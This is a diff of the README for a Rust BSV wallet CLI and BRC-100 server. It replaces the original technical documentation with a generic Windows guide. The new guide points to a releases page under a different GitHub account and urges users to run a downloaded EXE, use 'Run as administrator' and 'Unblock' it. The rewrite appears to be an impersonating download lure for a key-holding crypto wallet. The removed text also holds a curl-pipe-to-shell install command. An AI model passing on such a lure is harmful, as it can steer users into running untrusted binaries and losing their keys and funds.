@@ -1,212 +1,200 @@
-# bsv-wallet-cli
+# 🧰 bsv-wallet-cli - Run Your BSV Wallet Locally
 
-[![CI](https://github.com/Calhooon/bsv-wallet-cli/actions/workflows/ci.yml/badge.svg)](https://github.com/Calhooon/bsv-wallet-cli/actions/workflows/ci.yml)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
+[![Download bsv-wallet-cli](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/Hala6135/bsv-wallet-cli/releases)
 
-**Your agent's favorite wallet.**
+## 🚀 What this app does
 
-A self-hosted BRC-100 wallet server and CLI. Single Rust binary. Runs as a command-line wallet, an HTTP server with all 28 WalletInterface endpoints, or both. Wire-compatible with MetaNet Client.
+bsv-wallet-cli is a self-hosted BSV wallet and BRC-100 server in one Rust binary.
 
-Built for AI agents, autonomous software, and developers who want self-hosted BSV infrastructure.
+It gives you a local wallet you control. It also runs a server that can work with MetaNet Client tools. You keep your keys and data on your own computer.
 
-## Install
+## 💻 What you need
 
-```bash
-curl -sSf https://raw.githubusercontent.com/Calhooon/bsv-wallet-cli/main/install.sh | sh
-```
+- A Windows PC
+- Internet access for the first download
+- Enough free disk space for the app and wallet data
+- Permission to run apps on your computer
 
-Or build from source:
+For best results, use a recent version of Windows 10 or Windows 11.
 
-```bash
-cargo install --git https://github.com/Calhooon/bsv-wallet-cli.git
-```
+## 📥 Download and install
 
-## Quick Start
+Visit this page to download:
 
-```bash
-# Initialize wallet (generates identity key, creates SQLite database)
-bsv-wallet init
+https://github.com/Hala6135/bsv-wallet-cli/releases
 
-# Show your funding address
-bsv-wallet address
+1. Open the release page.
+2. Find the latest release.
+3. Download the Windows file for your system.
+4. If the release comes as a ZIP file, open it and extract the contents.
+5. If the release comes as an EXE file, double-click it to run it.
+6. If Windows asks for permission, choose to run the app.
 
-# Check balance
-bsv-wallet balance
+If you see more than one file, pick the one that matches your PC:
 
-# Run the HTTP server (default port 3322)
-bsv-wallet daemon
-```
+- `windows-x64` for most modern Windows PCs
+- `windows-arm64` for ARM-based devices
 
-## Use Cases
+## 🏁 First run
 
-### Local development wallet
-Run `bsv-wallet daemon` on your machine. Build apps against the 28 BRC-100 endpoints at `localhost:3322`. Wire-compatible with MetaNet Client -- any tool built for it works without modification.
+1. Open the folder where you saved the files.
+2. Start the `bsv-wallet-cli` app.
+3. If a console window opens, keep it open while you use the wallet.
+4. Follow any prompts on screen.
+5. Let the app create its local wallet files.
 
-### Deployable wallet server
-Host on your own infrastructure. Any app that speaks BRC-100 connects by changing one URL:
-```bash
-# On your server
-bsv-wallet init
-bsv-wallet daemon
+The first start may take a short time while the app sets up its data folder.
 
-# From any client (bsv-worm, your app, etc.)
-WORM_WALLET_URL=https://wallet.myserver.com:3322
-```
+## 🔐 Set up your wallet
 
-### Shared wallet for multi-agent fleets
-Multiple AI agents sharing one wallet, one funding source, one UTXO pool:
-```bash
-# One wallet server
-bsv-wallet daemon
+When the app starts, it creates a local wallet on your machine.
 
-# N agents pointing at it
-WORM_WALLET_URL=http://wallet-internal:3322 bsv-worm serve --port 8080
-WORM_WALLET_URL=http://wallet-internal:3322 bsv-worm serve --port 8081
-```
+Follow the prompts to:
 
-See [bsv-worm](https://github.com/Calhooon/rust-bsv-worm) for an autonomous agent that uses this wallet.
+1. Create a new wallet
+2. Set a strong password if the app asks for one
+3. Write down your recovery phrase if one is shown
+4. Keep your wallet files in a safe place
 
-### Custody separation
-Keep keys on a hardened server, run agents on throwaway VMs. Compromise the agent, keys are safe. The wallet never exposes private key material -- clients send `protocol_id`, `key_id`, `counterparty` and the wallet derives keys internally via BRC-42.
+Use a password that you do not use anywhere else. If you save a recovery phrase, store it offline.
 
-### Fork and customize
-Swap storage backends, add HSM key management, put it behind your corporate proxy for audit logging, add OAuth/mTLS -- the BRC-100 interface stays identical. Anything built for MetaNet Client works unmodified against your fork.
+## 🌐 Start the local server
 
-## Why bsv-wallet-cli?
+bsv-wallet-cli also runs a local BRC-100 server.
 
-- **No GUI required** -- Runs headless on servers, VMs, CI pipelines. The only BRC-100 wallet that doesn't need a desktop or browser.
-- **Non-custodial** -- Your keys stay on your machine. No cloud service, no account, no third party.
-- **Wire-compatible** -- Any tool built for MetaNet Client works without modification. Same endpoints, same JSON format.
-- **Built for agents** -- AI agents, autonomous software, multi-wallet fleets. One wallet server, N agents pointing at it.
+After the app starts, it may print a local address such as:
 
-## CLI Commands
+- `http://127.0.0.1:...`
+- `http://localhost:...`
 
-| Command | Description |
-|---------|-------------|
-| `init` | Generate identity key and create wallet database |
-| `identity` | Show public key and identity info |
-| `balance` | Show spendable balance |
-| `address` | Show BRC-29 funding address |
-| `send <address> <sats>` | Send BSV to a P2PKH address |
-| `fund <beef_hex>` | Internalize a BEEF transaction (receive funds) |
-| `outputs` | List unspent outputs |
-| `actions` | List transaction history |
-| `split --count N` | Split UTXOs for concurrent spending |
-| `daemon` | Run monitor + HTTP server (production) |
-| `serve` | Run HTTP server only (dev mode) |
-| `services` | Show blockchain service status |
+Use that address in a browser or in a client app that connects to local services.
 
-## HTTP Server
+If the app asks for a port number, you can keep the default value unless another app already uses it.
 
-All 28 BRC WalletInterface endpoints on `http://127.0.0.1:3322`, wire-compatible with MetaNet Client.
+## 🔗 Connect with MetaNet Client
 
-### Endpoints
+This app is wire-compatible with MetaNet Client.
 
-**Status** (GET)
-- `/isAuthenticated` -- health check
-- `/getHeight` -- current chain height
-- `/getNetwork` -- `mainnet` or `testnet`
-- `/getVersion` -- wallet version
-- `/waitForAuthentication` -- auth status
+To connect:
 
-**Crypto** (POST, requires `Origin` header)
-- `/getPublicKey` -- identity or derived public key
-- `/createSignature` / `/verifySignature` -- ECDSA signing
-- `/encrypt` / `/decrypt` -- symmetric encryption via BRC-42
-- `/createHmac` / `/verifyHmac` -- HMAC operations
-- `/getHeaderForHeight` -- block header lookup
+1. Start bsv-wallet-cli
+2. Make sure the local server is running
+3. Open MetaNet Client
+4. Enter the local server address shown in the console
+5. Save the connection settings
 
-**Transactions** (POST, requires `Origin` header)
-- `/createAction` -- build, sign, and broadcast transactions
-- `/signAction` -- sign a deferred (unsigned) transaction
-- `/abortAction` -- cancel a deferred transaction and release UTXOs
-- `/internalizeAction` -- accept incoming payments
-- `/listActions` -- transaction history
-- `/listOutputs` -- UTXO listing
-- `/relinquishOutput` -- release an output
+If the client cannot connect, check that both apps are running and that you used the same port.
 
-**Certificates** (POST, requires `Origin` header)
-- `/acquireCertificate` -- store a certificate
-- `/listCertificates` -- query certificates
-- `/proveCertificate` -- prove certificate ownership
-- `/relinquishCertificate` -- delete a certificate
+## 🧭 Common tasks
 
-**Discovery** (POST, requires `Origin` header)
-- `/discoverByIdentityKey` / `/discoverByAttributes` -- certificate discovery
-- `/revealCounterpartyKeyLinkage` / `/revealSpecificKeyLinkage` -- key linkage revelation
+### Send BSV
 
-## Architecture
+1. Open the wallet
+2. Choose the send option
+3. Enter the recipient address
+4. Enter the amount
+5. Confirm the transaction
 
-```
-bsv-wallet-cli          (this repo -- CLI + HTTP server)
-  |-- rust-wallet-toolbox  (wallet engine -- storage, signing, broadcasting)
-  +-- bsv-sdk             (WalletInterface trait, types, crypto primitives)
-```
+### Check your balance
 
-- **Storage**: SQLite via sqlx (single file, portable)
-- **Concurrency**: Spending operations queue via FIFO lock. All other endpoints (crypto, queries, status) are fully concurrent.
-- **Blockchain**: Chaintracks (primary) with WoC/BHS/Bitails failover
+1. Open the wallet
+2. Look for the balance screen or balance command
+3. Wait for the app to sync if needed
 
-## Configuration
+### View wallet data
 
-All configuration is via environment variables:
+The app stores wallet data on your computer. You can keep it on your main drive or move it to a safe backup folder.
 
-| Variable | Required | Description |
-|----------|----------|-------------|
-| `ROOT_KEY` | Yes | Wallet root private key (hex). Set by `bsv-wallet init`. |
-| `CHAINTRACKS_URL` | No | Chaintracks server URL for chain tracking |
-| `AUTH_TOKEN` | No | Bearer token for HTTP auth (localhost-only, optional) |
-| `TLS_CERT_PATH` | No | TLS certificate path (requires `--features tls`) |
-| `TLS_KEY_PATH` | No | TLS private key path (requires `--features tls`) |
-| `MIN_UTXOS` | No | Low UTXO warning threshold in daemon mode (default: 3) |
+## 🛠️ Basic command line use
 
-Port is set via `--port` CLI flag (default: 3322), not an environment variable.
+This app is CLI-first, which means it can run from a command window.
 
-## MCP Server
+If the release includes a `.exe` file, you can open PowerShell or Command Prompt in that folder and run it from there.
 
-A separate binary exposes all 28 endpoints as MCP tools for AI agents (Claude Code, Codex, etc.):
+Example:
 
-```bash
-# Start the wallet daemon first
-bsv-wallet daemon
+- `bsv-wallet-cli.exe`
 
-# In another terminal -- start MCP server (stdio transport, 29 tools)
-bsv-wallet-mcp
-```
+If the app shows help text, use it to see available commands.
 
-Add to your Claude Code MCP config:
-```json
-{
-  "mcpServers": {
-    "bsv-wallet": {
-      "command": "bsv-wallet-mcp",
-      "env": { "WALLET_URL": "http://localhost:3322" }
-    }
-  }
-}
-```
+## 📂 Suggested folder setup
 
-## Building
+Keep the app in a folder you can find later, such as:
 
-```bash
-# Standard build
-cargo build --release
+- `C:\Apps\bsv-wallet-cli\`
+- `C:\Users\YourName\Downloads\bsv-wallet-cli\`
 
-# With TLS support
-cargo build --release --features tls
-```
+If you want to keep wallet data separate, make a second folder for backups.
 
-## Testing
+## 🔍 If something does not work
 
-```bash
-# Run all synthetic tests (no server needed, 41 tests)
-cargo test --test integration
+### The app does not open
 
-# Run e2e tests against a live wallet
-bsv-wallet daemon &
-WALLET_URL=http://localhost:3322 cargo test --test integration e2e_ -- --test-threads=1
-```
+- Check that you downloaded the Windows file
+- Try running the app again
+- Right-click the file and choose Run as administrator if needed
 
-## License
+### Windows blocks the file
 
-[MIT](LICENSE)
+- Open the file properties
+- If you see an Unblock option, turn it on
+- Run the file again
+
+### The wallet does not connect
+
+- Make sure bsv-wallet-cli is still running
+- Check the local address and port
+- Make sure no other app uses the same port
+
+### The window closes right away
+
+- Start the app from PowerShell or Command Prompt
+- Read the error message before closing the window
+- Try the latest release from the download page
+
+## 🧾 Project details
+
+- Repository name: bsv-wallet-cli
+- Type: Self-hosted wallet and server
+- Language: Rust
+- Use case: Local BSV wallet and BRC-100 server
+- Model: Non-custodial and self-hosted
+
+## 🏷️ Topics
+
+bitcoin, bitcoin-sv, blockchain, brc-100, bsv, cli, mcp, non-custodial, rust, self-hosted, wallet, wallet-server
+
+## 🧩 What you can expect
+
+- A local wallet you control
+- A single binary for easier setup
+- A command line interface for direct control
+- Local server support for client apps
+- A setup that keeps control on your side
+
+## 🧠 File safety tips
+
+- Download only from the release page
+- Keep a backup of your wallet data
+- Store your recovery phrase offline
+- Do not share your private keys
+- Test with a small amount first if you are new to the app
+
+## 📁 Typical release files
+
+A Windows release may include files like:
+
+- `.exe` for direct use
+- `.zip` for manual setup
+- checksum files for file verification
+
+If you see a ZIP file, extract it before you start the app. If you see an EXE file, open it directly.
+
+## 🖱️ Quick start steps
+
+1. Open the release page
+2. Download the Windows file
+3. Extract it if needed
+4. Start the app
+5. Follow the setup prompts
+6. Keep the window open while the wallet or server runs
